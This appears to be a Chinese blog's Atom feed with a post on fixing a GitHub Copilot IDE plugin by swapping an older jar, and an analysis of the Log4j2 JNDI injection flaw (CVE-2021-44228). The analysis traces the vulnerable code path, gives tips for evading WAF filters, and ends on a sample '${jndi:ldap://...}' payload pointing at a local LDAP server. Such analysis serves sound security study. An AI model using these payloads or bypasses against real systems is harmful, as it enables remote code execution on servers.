<?xml version="1.0" encoding="utf-8"?>


<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN">
    <title type="text">Klear·blog</title>
    <subtitle type="html">Klear的生活记录&amp;&amp;工作记录。</subtitle>
    <updated>2023-02-06T15:27:12&#43;08:00</updated>
    <id>https://klearcc.github.io/</id>
    <link rel="alternate" type="text/html" href="https://klearcc.github.io/" />
    <link rel="self" type="application/atom&#43;xml" href="https://klearcc.github.io/atom.xml" />
    <author>
            <name>Klear</name>
            <uri>https://klearcc.github.io/</uri>
            
                <email>baicaix86@gmail.com</email>
            </author>
    <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights>
    <generator uri="https://gohugo.io/" version="0.103.1">Hugo</generator>
        <entry>
            <title type="text">github-copilot报错、无法连接、不自动提示问题解决</title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/github-copilot/" />
            <id>https://klearcc.github.io/post/github-copilot/</id>
            <updated>2023-02-06T15:27:02&#43;08:00</updated>
            <published>2023-02-04T21:14:27&#43;08:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">date：2023年 2月 4日 週六 22時4……</summary>
            
                <content type="html">&lt;h2 id=&#34;heading&#34;&gt;&lt;/h2&gt;
&lt;h3 id=&#34;date2023年-2月-4日-週六-22時49分59秒-cst&#34;&gt;date：2023年 2月 4日 週六 22時49分59秒 CST&lt;/h3&gt;
&lt;p&gt;&lt;del&gt;idea安装最新版本github-copilot插件&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;下载github-copilot-intellij-1.1.24.1610版本的插件，&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;将包内lib目录下core-1.1.24.jar拷贝到~/Library/Application Support/JetBrains/IntelliJIdea2022.2/plugins/github-copilot-intellij/lib下替换，再将文件名改为core-1.2.1.jar即可连接至github。&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;（若账户已有github-copilot许可但提示无许可，打开https://github.com/settings/copilot选择allow保存，等2min~重新连接）&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;（IntelliJIdea2022.2、core-1.2.1.jar的版本按需修改。）&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;插件链接https://plugins.jetbrains.com/plugin/17718-github-copilot/versions/stable&lt;/del&gt;&lt;/p&gt;
&lt;h3 id=&#34;date2023年-2月-6日-週一-15時03分17秒-cst&#34;&gt;date：2023年 2月 6日 週一 15時03分17秒 CST&lt;/h3&gt;
&lt;h3 id=&#34;goland-idea-pycharm都已尝试亲测有效无效砍头&#34;&gt;goland idea pycharm都已尝试，亲测有效，无效砍头&lt;/h3&gt;
&lt;p&gt;挂不挂代理都可，随心情&lt;/p&gt;
&lt;p&gt;1、下载github-copilot-intellij-1.1.35.2063&lt;code&gt;https://plugins.jetbrains.com/plugin/download?rel=true&amp;amp;updateId=243369&lt;/code&gt;和1417版&lt;code&gt;https://plugins.jetbrains.com/plugin/download?rel=true&amp;amp;updateId=172765&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2、idea正常安装2063版本的&lt;code&gt;copilot&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;3、关掉idea，将包内1417版本&lt;code&gt;copilot&lt;/code&gt;内lib目录下&lt;code&gt;core-1.1.20.jar&lt;/code&gt;拷贝到&lt;code&gt;~/Library/Application Support/JetBrains/IntelliJIdea2022.2/plugins/github-copilot-intellij/lib&lt;/code&gt;下替换，再将文件名改为&lt;code&gt;core-1.1.35.jar&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;4、进入idea插件设置，会提示要更新&lt;code&gt;copilot&lt;/code&gt;，点击更新+重启idea后即可正常使用&lt;/p&gt;
&lt;p&gt;重启idea即可正常使用：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/img202302061433333.png&#34; alt=&#34;image-20230206143308282&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/img202302061508006.png&#34; alt=&#34;image-20230206150838973&#34;&gt;&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/%E6%8F%92%E4%BB%B6/" term="插件" label="插件" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">log4j2反序列化漏洞分析</title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/log4j2/" />
            <id>https://klearcc.github.io/post/log4j2/</id>
            <updated>2022-12-28T17:46:06&#43;08:00</updated>
            <published>2022-12-27T17:08:27&#43;08:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">介绍 Apache Log4j2 是 Apache 软件基金会下的一个开源的基于……</summary>
            
                <content type="html">&lt;h2 id=&#34;介绍&#34;&gt;介绍&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://logging.apache.org/log4j/2.x/index.html&#34;&gt;Apache Log4j2&lt;/a&gt; 是 Apache 软件基金会下的一个&lt;a href=&#34;https://github.com/apache/logging-log4j2&#34;&gt;开源&lt;/a&gt;的基于 Java 的日志记录工具。Log4j2 是一个 Log4j 1.x 的重写，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。由于其优异的性能而被广泛的应用于各种常见的 Web 服务中。&lt;/p&gt;
&lt;p&gt;2021 年 12 月 9 日晚，Log4j2 的一个远程代码执行漏洞的利用细节被公开。攻击者使用 &lt;code&gt;${}&lt;/code&gt; 关键标识符触发 JNDI 注入漏洞，当程序将用户输入的数据进行日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码.&lt;/p&gt;
&lt;p&gt;目前，已经为此漏洞颁发了 CVE 编号：&lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2021-44228&#34;&gt;CVE-2021-44228&lt;/a&gt;，根据&lt;a href=&#34;https://logging.apache.org/log4j/2.x/security.html&#34;&gt;官方安全公告&lt;/a&gt;，以下为相关信息：
- 漏洞：Log4j2 的 JNDI 功能点无法防御来自攻击者的 ldap 以及其他相关端点的攻击行为。
- 严重等级：Critical
- Basic CVSS 评分：10.0 CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
- 影响版本：all versions from 2.0-beta9 to 2.14.1
- 详情描述：Apache Log4j2 &amp;lt;=2.14.1 版本提供的 JNDI 特性用于配置、日志信息、参数位置时，无法防护攻击者使用 ldap 或其他 JNDI 相关断点的攻击行为。攻击者如果可以控制日志信息或日志信息参数，则可以在开启了 lookup substitution 功能时利用恶意的 ladp 服务器执行任意代码，在 2.15.0 版本时，默认将其此行为关闭。
-缓解措施：升至 2.15.0及更新版本。&lt;/p&gt;
&lt;h2 id=&#34;复现&#34;&gt;复现&lt;/h2&gt;
&lt;p&gt;这里使用了&lt;a href=&#34;https://github.com/su18/JNDI&#34;&gt;su18师傅的jndi工具&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271346979.png&#34; alt=&#34;image-20221227134610282&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;分析&#34;&gt;分析&lt;/h2&gt;
&lt;h5 id=&#34;依赖&#34;&gt;依赖&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dependencies&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;&amp;lt;!--&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;https&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dependency&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;groupId&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;org&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;apache&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;logging&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;log4j&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;groupId&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;artifactId&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log4j&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;core&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;artifactId&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;14&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dependency&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;&amp;lt;!--&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;https&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dependency&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;groupId&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;org&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;apache&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;logging&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;log4j&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;groupId&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;artifactId&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log4j&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;api&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;artifactId&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;14&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dependency&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dependencies&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;idea：download source出错的话，在pom目录执行&lt;code&gt;mvn dependency:resolve -Dclassifier=sources&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;触发点：根据官方修订信息可以知道，是通过jndi中LDAP注入实现了rce。通过查看补丁修改记录发现对lookup函数进行了修改。
jndiLookup允许通过LDAP检索变量，使用：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;File name=&amp;#34;Application&amp;#34; fileName=&amp;#34;application.log&amp;#34;&amp;gt;
    &amp;lt;PatternLayout&amp;gt;
        &amp;lt;pattern&amp;gt;%d %p %c{1.} [%t] $${jndi:logging/context-name} %m%n&amp;lt;/pattern&amp;gt;
    &amp;lt;/PatternLayout&amp;gt;
&amp;lt;/File&amp;gt;
用法格式：${jndi:JNDIContent}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;有了触发点，也有了触发lookup的方法，只要找到入口点再传入jndi调用ldap就可以实现rce&lt;/p&gt;
&lt;p&gt;通常使用LogManager.getLogger()方法获取一个Logger对象，并调用其debug/info/error/warn/fatal/trace/log等方法记录日志等信息。
入口点：LogManager.getLogger()&lt;/p&gt;
&lt;h5 id=&#34;调用&#34;&gt;调用：&lt;/h5&gt;
&lt;p&gt;logger.error -&amp;gt; logIfEnabled
第一个关键点：这里调用AbstractLogger类的error()重写方法，再调用该类的logIfEnabled判断是否符合日志记录的等级要求。
（Log4j包括的日志等级层级分别为：ALL &amp;lt; DEBUG &amp;lt; INFO &amp;lt; WARN &amp;lt; ERROR &amp;lt; FATAL &amp;lt; OFF。当前事件的日志等级大于等于设置的日志等级时，才会符合条件进入logMessages()。默认会输出error/fatal等级的日志。可以使用配置文件更改日志输出等级：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;Configuration&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;Loggers&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nt&#34;&gt;&amp;lt;Logger&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;org.Klear&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;level=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;All&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;/Loggers&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/Configuration&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;）
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271511294.png&#34; alt=&#34;image-20221227151136221&#34;&gt;
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271511008.png&#34; alt=&#34;image-20221227151157977&#34;&gt;&lt;/p&gt;
&lt;p&gt;非关键调用：-&amp;gt; logMessage -&amp;gt; logMessageSafely -&amp;gt; logMessageTrackRecursion -&amp;gt; tryLogMessage -&amp;gt; log -&amp;gt; getReliabilityStrategy.log -&amp;gt; loggerConfig.log -&amp;gt; processLogEvent -&amp;gt; callAppenders -&amp;gt; callAppender -&amp;gt; callAppenderPreventRecursion -&amp;gt; tryCallAppender -&amp;gt; appender.append -&amp;gt; tryAppend -&amp;gt; directEncodeEvent -&amp;gt; encode -&amp;gt; toText -&amp;gt; toSerializable -&amp;gt; format -&amp;gt; format -&amp;gt; replace
第二个关键点 MessagePatternConverter#fomat
这里寻找&lt;code&gt;${&lt;/code&gt;，如果找到就会对{中间的字符}解析并replace
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271525406.png&#34; alt=&#34;image-20221227152557347&#34;&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; substitute
先看下当前类(StrSubstitutor)类中定义的几个变量：
DEFAULT_EACAPE是&lt;code&gt;$&lt;/code&gt;,前缀是&lt;code&gt;${&lt;/code&gt;，后缀是&lt;code&gt;}&lt;/code&gt;，还有两个赋值分隔符&lt;code&gt;:-&lt;/code&gt;、&lt;code&gt;:\\-&lt;/code&gt;
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271642768.png&#34; alt=&#34;image-20221227163025902&#34;&gt;
再回到StrSubstitutor#substitute
先while循环找前缀&lt;code&gt;${&lt;/code&gt;
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271642445.png&#34; alt=&#34;image-20221227163441437&#34;&gt;
找到前缀的话找后缀。在while循环中再判断是否替换变量中的值，如果替换了就再匹配一次前缀，如果又发现了前缀就continue跳出，再找一次后缀。此逻辑用来满足变量嵌套的情况
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271642871.png&#34; alt=&#34;image-20221227163922283&#34;&gt;
然后多个if匹配赋值分割符&lt;code&gt;:-&lt;/code&gt;、&lt;code&gt;:\-&lt;/code&gt;，这些可以用来绕过waf
- &lt;code&gt;:-&lt;/code&gt; 如果程序处理到 &lt;code&gt;${aaaa:-bbbb}&lt;/code&gt; 这样的字符串，处理的结果将会是 &lt;code&gt;bbbb&lt;/code&gt;，&lt;code&gt;:-&lt;/code&gt; 关键字将会被截取掉，而之前的字符串都会被舍弃掉。
- &lt;code&gt;:\-&lt;/code&gt; 如果一个用 &lt;code&gt;a:b&lt;/code&gt; 表示的键值对的 key &lt;code&gt;a&lt;/code&gt; 中包含 &lt;code&gt;:&lt;/code&gt;，则需要使用转义来配合处理，例如 &lt;code&gt;${aaa:\\-bbb:-ccc}&lt;/code&gt;，代表 key 是，&lt;code&gt;aaa:bbb&lt;/code&gt;，value 是 &lt;code&gt;ccc&lt;/code&gt;。
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271643081.png&#34; alt=&#34;image-20221227164315019&#34;&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; resolveVariable
处理完毕后，调用resolveVariable方法解析满足Lookup功能的语法，执行相应的lookup，将返回的结果替换原字符串后，再调佣subsitute递归循环处理。&lt;/p&gt;
&lt;p&gt;-&amp;gt; lookup -&amp;gt; Interpolator#lookup
先截取字符串的前缀值并转换为小写&lt;code&gt;jndi&lt;/code&gt;(也可以用来绕过过滤)，然后用name接收剩下的字符串&lt;code&gt;ldap://127.0.0.1:23457/Command8&lt;/code&gt;
当匹配到内置方法，就进入对应的处理方法。这里进入JndiLookup处理
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271552067.png&#34; alt=&#34;image-20221227155222022&#34;&gt;
附：
在使用Lookup功能时，是由这个Interpolator类来处理和分发。
这个类的构造方法中创建了一个strLookupMap，将一些功能关键字和处理类进行了映射
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271659031.png&#34; alt=&#34;image-20221227165940984&#34;&gt;
除了使用jndi查询外，log4j2还支持上面很多lookup功能，包括获取环境变量、系统配置、Java 环境等，并且它还支持递归嵌套解析。所以可以通过这些关键字来实现一些攻击思路。&lt;/p&gt;
&lt;p&gt;-&amp;gt;JndiLookup#lookup(jndiManager.lookup)
这里lookup方法使用JndiManager来支持jndi的查询功能，触发
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/img202212271557562.png&#34; alt=&#34;image-20221227155740528&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;绕过利用方式举例&#34;&gt;绕过&amp;amp;&amp;amp;利用方式举例&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//        String a = &amp;#34;${jndi:ldap://127.0.0.1:23457/Command8}&amp;#34;;//
